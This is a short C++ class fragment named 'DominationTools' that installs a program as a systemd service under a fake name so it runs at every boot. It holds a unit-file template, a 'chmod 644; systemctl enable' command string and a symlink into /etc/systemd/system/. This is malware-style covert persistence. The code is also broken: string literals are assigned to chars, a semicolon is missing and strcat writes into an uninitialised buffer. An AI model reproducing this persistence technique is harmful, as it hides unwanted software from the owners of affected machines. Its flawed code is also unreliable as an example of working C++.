class DominationTools{
	private:
		FILE* smb;


		char symb[sizeof(Current.fakename)+21];

		char data= "[Unit]\n"
			   "Description=%s.\n"

			   "[Service]\n"
			   "Type=simple\n"
			   "ExecStart=%s\n"

			   "[Install]\n"
			   "WantedBy=multi-user.target\n"

		char cmd="chmod 644 %s; systemctl enable %s";

	public:
		DominationTools(){
			strcat(symb, "/etc/systemd/system/");
			strcat(symb, Current.fakename);

		}
		void EnableAutoStart(){
			symlink(Current.name, symb);

			printf("%s\n", symb);
			perror(" ");
		}
};
